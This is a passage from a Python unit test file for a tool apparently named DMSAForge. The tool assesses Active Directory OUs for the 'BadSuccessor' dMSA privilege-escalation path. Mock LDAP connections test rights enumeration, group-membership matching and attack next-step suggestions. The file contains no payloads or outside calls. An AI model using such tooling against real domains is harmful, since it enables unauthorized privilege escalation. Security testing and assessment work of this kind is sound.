            def search(self, search_base=None, search_filter=None, **kwargs):
                self.calls.append((search_base, search_filter))
                if search_filter and 'userAccountControl:1.2.840.113556.1.4.803:=8192' in search_filter:
                    self.entries = []
                    self.result = {'result': -1, 'description': 'error', 'message': 'parser issue'}
                    return False
                if search_filter == '(objectClass=organizationalUnit)':
                    self.entries = [
                        cli._LDAPEntry(
                            'OU=Staff,DC=test,DC=local',
                            {'distinguishedName': [b'OU=Staff,DC=test,DC=local']},
                        )
                    ]
                    self.result = {'result': 0, 'description': 'success', 'message': ''}
                    return True
                return False

        forge = minimal_forge()
        forge._search_summary = True
        forge._search_include_sd = False
        forge._search_resolve_names = False
        forge._skip_dc_prereq = False
        forge._target_ou = 'OU=Staff,DC=test,DC=local'
        forge._options = execution_options(target_ou='OU=Staff,DC=test,DC=local')

        with contextlib.redirect_stderr(io.StringIO()):
            success = forge.search_ous(SearchConnection())

        self.assertTrue(success)
        self.assertEqual(forge.report['result']['ou_count'], 1)
        self.assertEqual(forge.report['result']['search_base'], 'OU=Staff,DC=test,DC=local')
        self.assertIn('Domain Controller prerequisite check failed', forge.report['result']['dc_prereq_warning'])

    def test_search_report_explains_badsuccessor_relevant_rights(self):
        class EmptyRightsConnection:
            def __init__(self):
                self.bound = True
                self.entries = []
                self.result = {'result': 0, 'description': 'success', 'message': ''}

            def search(self, search_base=None, search_filter=None, **kwargs):
                if search_filter == '(objectClass=organizationalUnit)':
                    self.entries = [
                        cli._LDAPEntry(
                            'OU=Staff,DC=test,DC=local',
                            {'distinguishedName': ['OU=Staff,DC=test,DC=local']},
                        )
                    ]
                    return True
                if search_filter == '(objectClass=domain)':
                    self.entries = []
                    return True
                self.entries = []
                return True

        forge = minimal_forge()
        forge._search_summary = False
        forge._search_include_sd = True
        forge._search_resolve_names = False
        forge._skip_dc_prereq = True
        forge._target_ou = 'OU=Staff,DC=test,DC=local'
        forge._options = execution_options(target_ou='OU=Staff,DC=test,DC=local', include_sd=True)

        with contextlib.redirect_stderr(io.StringIO()):
            success = forge.search_ous(EmptyRightsConnection())

        self.assertTrue(success)
        self.assertEqual(forge.report['result']['identity_count'], 0)
        self.assertEqual(forge.report['result']['rights_label'], cli.BADSUCCESSOR_RIGHTS_LABEL)
        self.assertIn('create dMSA objects', forge.report['result']['rights_meaning'])
        self.assertIn('listed OUs', forge.report['result']['rights_meaning'])

    def test_search_marks_rights_that_apply_to_bound_user_token_groups(self):
        group_sid = 'S-1-5-21-1-2-3-1604'
        user_sid = 'S-1-5-21-1-2-3-1101'

        forge = minimal_forge()
        forge._username = 'adam.scott'
        forge._domain = 'test.local'
        forge._search_summary = False
        forge._search_include_sd = True
        forge._search_resolve_names = False
        forge._skip_dc_prereq = True
        forge._target_ou = 'OU=Staff,DC=test,DC=local'
        forge._options = execution_options(target_ou='OU=Staff,DC=test,DC=local', include_sd=True)

        class CurrentUserRightsConnection:
            def __init__(self):
                self.bound = True
                self.entries = []
                self.result = {'result': 0, 'description': 'success', 'message': ''}

            def search(self, search_base=None, search_filter=None, attributes=None, **kwargs):
                if search_filter == '(objectClass=organizationalUnit)':
                    self.entries = [
                        cli._LDAPEntry(
                            'OU=Staff,DC=test,DC=local',
                            {
                                'distinguishedName': ['OU=Staff,DC=test,DC=local'],
                                'nTSecurityDescriptor': [b'fake-sd'],
                            },
                        )
                    ]
                    return True
                if search_filter == '(objectClass=domain)':
                    self.entries = [
                        cli._LDAPEntry(
                            'DC=test,DC=local',
                            {'objectSid': ['S-1-5-21-1-2-3']},
                        )
                    ]
                    return True
                if search_filter and 'sAMAccountName=adam.scott' in search_filter:
                    self.entries = [
                        cli._LDAPEntry(
                            'CN=adam.scott,OU=Staff,DC=test,DC=local',
                            {
                                'objectClass': ['top', 'person', 'user'],
                                'objectSid': [user_sid],
                                'primaryGroupID': ['513'],
                                'sAMAccountName': ['adam.scott'],
                                'cn': ['adam.scott'],
                                'name': ['adam.scott'],
                                'userPrincipalName': ['adam.scott@test.local'],
                            },
                        )
                    ]
                    return True
                if search_base == 'CN=adam.scott,OU=Staff,DC=test,DC=local' and attributes and 'tokenGroups' in attributes:
                    self.entries = [
                        cli._LDAPEntry(
                            'CN=adam.scott,OU=Staff,DC=test,DC=local',
                            {'tokenGroups': [group_sid]},
                        )
                    ]
                    return True
                self.entries = []
                return True

        class FakeSid:
            def __init__(self, sid):
                self.sid = sid

            def formatCanonical(self):
                return self.sid

        class FakeMask:
            def __getitem__(self, key):
                if key == 'Mask':
                    return 0x10000000
                raise KeyError(key)

        class FakeAceData:
            def __getitem__(self, key):
                if key == 'Mask':
                    return FakeMask()
                if key == 'Sid':
                    return FakeSid(group_sid)
                raise KeyError(key)

        class FakeAce:
            def __getitem__(self, key):
                if key == 'AceType':
                    return 0
                if key == 'Ace':
                    return FakeAceData()
                raise KeyError(key)

        class FakeDacl:
            aces = [FakeAce()]

        class FakeSD:
            def __init__(self, data=None):
                pass

            def __getitem__(self, key):
                if key == 'Dacl':
                    return FakeDacl()
                if key == 'OwnerSid':
                    return FakeSid(group_sid)
                raise KeyError(key)

        original_ldaptypes = cli.ldaptypes
        try:
            cli.ldaptypes = types.SimpleNamespace(
                SR_SECURITY_DESCRIPTOR=FakeSD,
                ACCESS_ALLOWED_ACE=types.SimpleNamespace(ACE_TYPE=0),
            )
            with contextlib.redirect_stderr(io.StringIO()):
                success = forge.search_ous(CurrentUserRightsConnection())
        finally:
            cli.ldaptypes = original_ldaptypes

        self.assertTrue(success)
        self.assertEqual(forge.report['result']['bound_user']['status'], 'ok')
        self.assertTrue(forge.report['result']['bound_user']['token_groups_read'])
        self.assertEqual(forge.report['result']['bound_user']['group_sid_source'], 'tokenGroups')
        self.assertEqual(forge.report['result']['bound_user']['effective_sid_sources'][group_sid], 'group SID from tokenGroups')
        self.assertEqual(forge.report['result']['bound_account']['sam_account_name'], 'adam.scott')
        self.assertEqual(forge.report['result']['bound_user_match_count'], 1)
        self.assertEqual(forge.report['result']['bound_account_match_count'], 1)
        self.assertEqual(forge.report['result']['identities'][0]['sid'], group_sid)
        self.assertEqual(forge.report['result']['identities'][0]['applies_to_bound_user'], 'yes')
        self.assertEqual(forge.report['result']['identities'][0]['bound_account_match'], 'yes')
        self.assertEqual(forge.report['result']['identities'][0]['bound_account_match_source'], 'group SID from tokenGroups')
        self.assertEqual(forge.report['result']['_next_step_candidates'][0]['identity'], group_sid)

    def test_search_does_not_suggest_add_for_unmatched_bound_account(self):
        rights_sid = 'S-1-5-21-1-2-3-1604'
        unrelated_group_sid = 'S-1-5-21-1-2-3-2604'
        user_sid = 'S-1-5-21-1-2-3-1101'

        forge = minimal_forge()
        forge._username = 'adam.scott'
        forge._domain = 'test.local'
        forge._search_summary = False
        forge._search_include_sd = True
        forge._search_resolve_names = False
        forge._skip_dc_prereq = True
        forge._target_ou = 'OU=Staff,DC=test,DC=local'
        forge._options = execution_options(target_ou='OU=Staff,DC=test,DC=local', include_sd=True)

        class UnmatchedRightsConnection:
            def __init__(self):
                self.bound = True
                self.entries = []
                self.result = {'result': 0, 'description': 'success', 'message': ''}

            def search(self, search_base=None, search_filter=None, attributes=None, **kwargs):
                if search_filter == '(objectClass=organizationalUnit)':
                    self.entries = [
                        cli._LDAPEntry(
                            'OU=Staff,DC=test,DC=local',
                            {
                                'distinguishedName': ['OU=Staff,DC=test,DC=local'],
                                'nTSecurityDescriptor': [b'fake-sd'],
                            },
                        )
                    ]
                    return True
                if search_filter == '(objectClass=domain)':
                    self.entries = [
                        cli._LDAPEntry(
                            'DC=test,DC=local',
                            {'objectSid': ['S-1-5-21-1-2-3']},
                        )
                    ]
                    return True
                if search_filter and 'sAMAccountName=adam.scott' in search_filter:
                    self.entries = [
                        cli._LDAPEntry(
                            'CN=adam.scott,OU=Staff,DC=test,DC=local',
                            {
                                'objectClass': ['top', 'person', 'user'],
                                'objectSid': [user_sid],
                                'primaryGroupID': ['513'],
                                'sAMAccountName': ['adam.scott'],
                            },
                        )
                    ]
                    return True
                if search_base == 'CN=adam.scott,OU=Staff,DC=test,DC=local' and attributes and 'tokenGroups' in attributes:
                    self.entries = [
                        cli._LDAPEntry(
                            'CN=adam.scott,OU=Staff,DC=test,DC=local',
                            {'tokenGroups': [unrelated_group_sid]},
                        )
                    ]
                    return True
                self.entries = []
                return True

        class FakeSid:
            def __init__(self, sid):
                self.sid = sid

            def formatCanonical(self):
                return self.sid

        class FakeMask:
            def __getitem__(self, key):
                if key == 'Mask':
                    return 0x10000000
                raise KeyError(key)

        class FakeAceData:
            def __getitem__(self, key):
                if key == 'Mask':
                    return FakeMask()
                if key == 'Sid':
                    return FakeSid(rights_sid)
                raise KeyError(key)

        class FakeAce:
            def __getitem__(self, key):
                if key == 'AceType':
                    return 0
                if key == 'Ace':
                    return FakeAceData()
                raise KeyError(key)

        class FakeDacl:
            aces = [FakeAce()]

        class FakeSD:
            def __init__(self, data=None):
                pass

            def __getitem__(self, key):
                if key == 'Dacl':
                    return FakeDacl()
                if key == 'OwnerSid':
                    return FakeSid('S-1-5-18')
                raise KeyError(key)

        original_ldaptypes = cli.ldaptypes
        try:
            cli.ldaptypes = types.SimpleNamespace(
                SR_SECURITY_DESCRIPTOR=FakeSD,
                ACCESS_ALLOWED_ACE=types.SimpleNamespace(ACE_TYPE=0),
            )
            with contextlib.redirect_stderr(io.StringIO()):
                success = forge.search_ous(UnmatchedRightsConnection())
        finally:
            cli.ldaptypes = original_ldaptypes

        self.assertTrue(success)
        self.assertEqual(forge.report['result']['identity_count'], 1)
        self.assertEqual(forge.report['result']['bound_account_match_count'], 0)
        self.assertEqual(forge.report['result']['identities'][0]['bound_account_match'], 'no')
        self.assertEqual(forge.report['result']['_next_step_candidates'], [])

    def test_search_marks_rights_that_apply_to_bound_user_recursive_groups(self):
        group_sid = 'S-1-5-21-1-2-3-1604'
        user_sid = 'S-1-5-21-1-2-3-1101'

        forge = minimal_forge()
        forge._username = 'adam.scott'
        forge._domain = 'test.local'
        forge._search_summary = False
        forge._search_include_sd = True
        forge._search_resolve_names = False
        forge._skip_dc_prereq = True
        forge._target_ou = 'OU=Staff,DC=test,DC=local'
        forge._options = execution_options(target_ou='OU=Staff,DC=test,DC=local', include_sd=True)

        class CurrentUserRecursiveGroupConnection:
            def __init__(self):
                self.bound = True
                self.entries = []
                self.result = {'result': 0, 'description': 'success', 'message': ''}

            def search(self, search_base=None, search_filter=None, attributes=None, **kwargs):
                if search_filter == '(objectClass=organizationalUnit)':
                    self.entries = [
                        cli._LDAPEntry(
                            'OU=Staff,DC=test,DC=local',
                            {
                                'distinguishedName': ['OU=Staff,DC=test,DC=local'],
                                'nTSecurityDescriptor': [b'fake-sd'],
                            },
                        )
                    ]
                    return True
                if search_filter == '(objectClass=domain)':
                    self.entries = [
                        cli._LDAPEntry(
                            'DC=test,DC=local',
                            {'objectSid': ['S-1-5-21-1-2-3']},
                        )
                    ]
                    return True
                if search_filter and 'sAMAccountName=adam.scott' in search_filter:
                    self.entries = [
                        cli._LDAPEntry(
                            'CN=adam.scott,OU=Staff,DC=test,DC=local',
                            {
                                'objectClass': ['top', 'person', 'user'],
                                'objectSid': [user_sid],
                                'primaryGroupID': ['513'],
                                'sAMAccountName': ['adam.scott'],
                                'cn': ['adam.scott'],
                                'name': ['adam.scott'],
                                'userPrincipalName': ['adam.scott@test.local'],
                            },
                        )
                    ]
                    return True
                if search_base == 'CN=adam.scott,OU=Staff,DC=test,DC=local' and attributes and 'tokenGroups' in attributes:
                    self.entries = [
                        cli._LDAPEntry(
                            'CN=adam.scott,OU=Staff,DC=test,DC=local',
                            {'objectSid': [user_sid]},
                        )
                    ]
                    return True
                if search_filter and 'member:1.2.840.113556.1.4.1941:=' in search_filter:
                    self.entries = [
                        cli._LDAPEntry(
                            'CN=Delegated dMSA Writers,OU=Staff,DC=test,DC=local',
                            {
                                'objectClass': ['top', 'group'],
                                'objectSid': [group_sid],
                                'sAMAccountName': ['Delegated dMSA Writers'],
                            },
                        )
                    ]
                    return True
                self.entries = []
                return True

        class FakeSid:
            def __init__(self, sid):
                self.sid = sid

            def formatCanonical(self):
                return self.sid

        class FakeMask:
            def __getitem__(self, key):
                if key == 'Mask':
                    return 0x10000000
                raise KeyError(key)

        class FakeAceData:
            def __getitem__(self, key):
                if key == 'Mask':
                    return FakeMask()
                if key == 'Sid':
                    return FakeSid(group_sid)
                raise KeyError(key)

        class FakeAce:
            def __getitem__(self, key):
                if key == 'AceType':
                    return 0
                if key == 'Ace':
                    return FakeAceData()
                raise KeyError(key)

        class FakeDacl:
            aces = [FakeAce()]

        class FakeSD:
            def __init__(self, data=None):
                pass

            def __getitem__(self, key):
                if key == 'Dacl':
                    return FakeDacl()
                if key == 'OwnerSid':
                    return FakeSid(group_sid)
                raise KeyError(key)

        original_ldaptypes = cli.ldaptypes
        try:
            cli.ldaptypes = types.SimpleNamespace(
                SR_SECURITY_DESCRIPTOR=FakeSD,
                ACCESS_ALLOWED_ACE=types.SimpleNamespace(ACE_TYPE=0),
            )
            with contextlib.redirect_stderr(io.StringIO()):
                success = forge.search_ous(CurrentUserRecursiveGroupConnection())
        finally:
            cli.ldaptypes = original_ldaptypes

        self.assertTrue(success)
        self.assertEqual(forge.report['result']['bound_user']['status'], 'ok')
        self.assertFalse(forge.report['result']['bound_user']['token_groups_read'])
        self.assertTrue(forge.report['result']['bound_user']['group_sids_resolved'])
        self.assertEqual(forge.report['result']['bound_user']['group_sid_source'], 'recursive_group_membership')
        self.assertEqual(forge.report['result']['bound_user']['effective_sid_sources'][group_sid], 'group SID from recursive membership')
        self.assertEqual(forge.report['result']['bound_user_match_count'], 1)
        self.assertEqual(forge.report['result']['identities'][0]['applies_to_bound_user'], 'yes')
        self.assertEqual(forge.report['result']['identities'][0]['bound_account_match_source'], 'group SID from recursive membership')

    def test_search_handles_object_specific_dmsa_create_child_aces(self):
        principal_sid = 'S-1-5-21-1-2-3-1604'
        user_sid = 'S-1-5-21-1-2-3-1104'
        dmsa_guid = '0feb936f-47b3-49f2-9386-1dedc2c23765'

        def run_with_object_type(object_type):
            options = execution_options(
                action='assess',
                include_sd=True,
                search_summary=False,
                skip_dc_prereq=True,
            )
            forge = cli.DMSAForge('adam.scott', 'pw', 'test.local', '', '', options)

            class ObjectAceConnection:
                def __init__(self):
                    self.bound = True
                    self.entries = []
                    self.result = {'result': 0, 'description': 'success', 'message': ''}

                def search(self, search_base=None, search_filter=None, attributes=None, **kwargs):
                    if search_filter == '(objectClass=organizationalUnit)':
                        self.entries = [
                            cli._LDAPEntry(
                                'OU=Staff,DC=test,DC=local',
                                {'nTSecurityDescriptor': [b'fake-sd']},
                            )
                        ]
                        return True
                    if search_filter == '(objectClass=domain)':
                        self.entries = [
                            cli._LDAPEntry(
                                'DC=test,DC=local',
                                {'objectSid': ['S-1-5-21-1-2-3']},
                            )
                        ]
                        return True
                    if search_filter and 'sAMAccountName=adam.scott' in search_filter:
                        self.entries = [
                            cli._LDAPEntry(
                                'CN=adam.scott,OU=Staff,DC=test,DC=local',
                                {
                                    'objectClass': ['top', 'person', 'user'],
                                    'objectSid': [user_sid],
                                    'primaryGroupID': ['513'],
                                    'sAMAccountName': ['adam.scott'],
                                    'cn': ['adam.scott'],
                                    'name': ['adam.scott'],
                                    'userPrincipalName': ['adam.scott@test.local'],
                                },
                            )
                        ]
                        return True
                    if search_base == 'CN=adam.scott,OU=Staff,DC=test,DC=local' and attributes and 'tokenGroups' in attributes:
                        self.entries = [
                            cli._LDAPEntry(
                                'CN=adam.scott,OU=Staff,DC=test,DC=local',
                                {'tokenGroups': [principal_sid]},
                            )
                        ]
                        return True
                    self.entries = []
                    return True

            class FakeSid:
                def __init__(self, sid):
                    self.sid = sid

                def formatCanonical(self):
                    return self.sid

            class FakeMask:
                def __getitem__(self, key):
                    if key == 'Mask':
                        return 0x00000001
                    raise KeyError(key)

            class FakeAceData:
                def __getitem__(self, key):
                    if key == 'Mask':
                        return FakeMask()
                    if key == 'Sid':
                        return FakeSid(principal_sid)
                    if key == 'ObjectType':
                        return object_type
                    raise KeyError(key)

            class FakeAce:
                def __getitem__(self, key):
                    if key == 'AceType':
                        return 5
                    if key == 'Ace':
                        return FakeAceData()
                    raise KeyError(key)

            class FakeDacl:
                aces = [FakeAce()]

            class FakeSD:
                def __init__(self, data=None):
                    pass

                def __getitem__(self, key):
                    if key == 'Dacl':
                        return FakeDacl()
                    if key == 'OwnerSid':
                        return FakeSid('S-1-5-18')
                    raise KeyError(key)

            original_ldaptypes = cli.ldaptypes
            try:
                cli.ldaptypes = types.SimpleNamespace(
                    SR_SECURITY_DESCRIPTOR=FakeSD,
                    ACCESS_ALLOWED_ACE=types.SimpleNamespace(ACE_TYPE=0),
                    ACCESS_ALLOWED_OBJECT_ACE=types.SimpleNamespace(ACE_TYPE=5),
                )
                with contextlib.redirect_stderr(io.StringIO()):
                    success = forge.search_ous(ObjectAceConnection())
            finally:
                cli.ldaptypes = original_ldaptypes

            self.assertTrue(success)
            return forge.report['result']

        dmsa_result = run_with_object_type(dmsa_guid)
        self.assertEqual(dmsa_result['identity_count'], 1)
        self.assertEqual(dmsa_result['identities'][0]['sid'], principal_sid)
        self.assertEqual(dmsa_result['identities'][0]['bound_account_match'], 'yes')

        unrelated_result = run_with_object_type('11111111-1111-1111-1111-111111111111')
        self.assertEqual(unrelated_result['identity_count'], 0)

    def test_search_falls_back_to_authenticated_account_ou_when_broad_ou_search_fails(self):
        class FallbackConnection:
            def __init__(self):
                self.bound = True
                self.entries = []
                self.result = {'result': 0, 'description': 'success', 'message': ''}
                self.calls = []

            def search(self, search_base=None, search_filter=None, attributes=None, **kwargs):
                self.calls.append((search_base, search_filter))
                if search_filter == '(objectClass=organizationalUnit)' and search_base == 'DC=test,DC=local':
                    self.entries = []
                    self.result = {'result': -1, 'description': 'error', 'message': 'parser issue'}
                    return False
                if search_filter and 'sAMAccountName=adam.scott' in search_filter:
                    assert attributes == ['distinguishedName', 'sAMAccountName']
                    self.entries = [
                        cli._LDAPEntry(
                            'CN=adam.scott,OU=Staff,DC=test,DC=local',
                            {
                                'distinguishedName': ['CN=adam.scott,OU=Staff,DC=test,DC=local'],
                                'sAMAccountName': ['adam.scott'],
                            },
                        )
                    ]
                    self.result = {'result': 0, 'description': 'success', 'message': ''}
                    return True
                if search_filter == '(objectClass=organizationalUnit)' and search_base == 'OU=Staff,DC=test,DC=local':
                    self.entries = [
                        cli._LDAPEntry(
                            'OU=Staff,DC=test,DC=local',
                            {'distinguishedName': ['OU=Staff,DC=test,DC=local']},
                        )
                    ]
                    self.result = {'result': 0, 'description': 'success', 'message': ''}
                    return True
                self.entries = []
                self.result = {'result': 0, 'description': 'success', 'message': ''}
                return True

        forge = minimal_forge()
        forge._username = 'adam.scott'
        forge._search_summary = True
        forge._search_include_sd = False
        forge._search_resolve_names = False
        forge._skip_dc_prereq = True
        forge._target_ou = None
        forge._options = execution_options(account='test.local/adam.scott:pw', target_ou=None)

        with contextlib.redirect_stderr(io.StringIO()):
            success = forge.search_ous(FallbackConnection())

        self.assertTrue(success)
        self.assertEqual(forge._options.target_ou, 'OU=Staff,DC=test,DC=local')
        self.assertEqual(forge.report['result']['ou_count'], 1)
        self.assertEqual(forge.report['result']['search_base'], 'OU=Staff,DC=test,DC=local')
        self.assertIn('Broad OU assessment failed', forge.report['result']['search_fallback'])
        self.assertTrue(any(event['kind'] == 'target_ou' and event['status'] == 'fallback' for event in forge.report['inference']))

    def test_ldap_compat_does_not_append_port_to_impacket_url(self):
        captured = []

        class FakeConnection:
            def __init__(self, url, baseDN='', dstIp=None, signing=True):
                captured.append((url, baseDN, dstIp, signing))

            def login(self, *args, **kwargs):
                return None

        original = cli.impacket_ldap
        try:
            cli.impacket_ldap = types.SimpleNamespace(LDAPConnection=FakeConnection)
            cli.LDAPCompat(
                domain='test.local',
                username='admin',
                password='pw',
                lmhash='',
                nthash='',
                aes_key=None,
                do_kerberos=False,
                target_host='dc01.test.local',
                dc_ip=None,
                base_dn='DC=test,DC=local',
                use_ldaps=False,
                kdc_host=None,
                port=389,
            )
        finally:
            cli.impacket_ldap = original

        self.assertEqual(captured[0][0], 'ldap://dc01.test.local')
        self.assertEqual(captured[0][2], None)

    def test_output_file_rejects_symlink_when_supported(self):
        if not hasattr(os, 'O_NOFOLLOW'):
            self.skipTest('O_NOFOLLOW is not available on this platform')

        with tempfile.TemporaryDirectory() as tmpdir:
            target_path = os.path.join(tmpdir, 'target.json')
            link_path = os.path.join(tmpdir, 'report.json')
            with open(target_path, 'w') as handle:
                handle.write('{}')
            try:
                os.symlink(target_path, link_path)
            except (AttributeError, NotImplementedError, OSError) as exc:
                self.skipTest('symlinks are not available: %s' % exc)

            with self.assertRaises(OSError):
                cli.write_output_file(link_path, '{"ok": true}\n')


if __name__ == '__main__':
    unittest.main()
